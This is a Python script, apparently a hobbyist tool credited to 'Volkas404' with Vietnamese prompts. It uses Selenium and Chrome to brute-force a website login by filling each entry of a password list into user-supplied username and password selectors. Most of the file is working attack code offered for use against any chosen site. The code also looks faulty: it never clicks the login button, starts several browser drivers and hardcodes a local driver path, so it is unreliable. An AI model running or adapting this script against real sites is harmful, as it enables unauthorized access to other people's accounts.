import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException


#Graphics
class color:
   PURPLE = "\033[95m"
   CYAN = "\033[96m"
   DARKCYAN = "\033[36m"
   BLUE = "\033[94m"
   GREEN = "\033[92m"
   YELLOW = "\033[93m"
   RED = "\033[91m"
   BOLD = "\033[1m"
   UNDERLINE = "\033[4m"
   END = "\033[0m"
   CWHITE  = "\33[37m"


#Config#
parser = OptionParser()
now = datetime.datetime.now()


#Args
parser.add_option("-u", "--username", dest="username",help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
(options, args) = parser.parse_args()


CHROME_DVR_DIR = "C:/Users/Administrator/Desktop/Brute/chromedriver.exe" # tải chromedriver phù hợp với chrome đang dùng và thay đường dẫn

def wizard():
    print (banner)
    website = input("Enter a website: ")
    sys.stdout.write(color.GREEN + "[!] "+color.CWHITE + "Đang kiểm tra "),
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print (color.GREEN + "[OK]"+color.CWHITE)
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print (color.RED + "[!]"+color.CWHITE+ "Ctrl + C để dừng lại")
        exit()
    except:
        t.sleep(1)
        print (color.RED + "[X]"+color.CWHITE)
        t.sleep(1)
        print (color.RED + "[!]"+color.CWHITE+ " Không thể xác định http hoặc https")
        exit()

    username_selector = input(color.GREEN + "[~] " + color.CWHITE + "Tài khoản selector: ")
    password_selector = input(color.GREEN + "[~] " + color.CWHITE + "Mật khẩu selector: ")
    login_btn_selector = input(color.GREEN + "[~] " + color.CWHITE + "Nút đăng nhập selector: ")
    username = input(color.GREEN + "[~] " + color.CWHITE + "Tài khoản cần vét cạn: ")
    pass_list = input(color.GREEN + "[~] " + color.CWHITE + "Nhập passlist: ")
    brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)

def brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website):
    f = open(pass_list, "r")
    driver = webdriver.Chrome(CHROME_DVR_DIR)
    optionss = webdriver.ChromeOptions()
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    count = 1 #count
    browser = webdriver.Chrome(CHROME_DVR_DIR)
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(2)
                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                # browser.find_element_by_css_selector(password_selector).clear()
                # browser.find_element_by_css_selector(username_selector).clear()
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                t.sleep(5)
                print ("------------------------")
                print (color.GREEN + "Tried password: "+color.RED + line + color.GREEN + "for user: "+color.RED+ username)
                print ("------------------------")
                temp = line 
        except KeyboardInterrupt: #returns to main menu if ctrl C is used
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print (color.GREEN + "Đã tìm được mật khẩu: {0}".format(temp))
            exit()



banner = color.BOLD + color.RED +"""

  {0}[{1}-{2}]--> {3}V.1.0
  {4}[{5}-{6}]--> {7}coded by Volkas404
  {8}[{9}-{10}]-->{11} Thuật toán vét cạn                    """.format(color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN,color.RED, color.CWHITE,color.RED,color.GREEN)

driver = webdriver.Chrome(CHROME_DVR_DIR)
optionss = webdriver.ChromeOptions()
optionss.add_argument("--disable-popup-blocking")
optionss.add_argument("--disable-extensions")
count = 1 #count

if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        wizard()


username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
print (banner)
brutes(username, username_selector ,password_selector,login_btn_selector,pass_list, website)
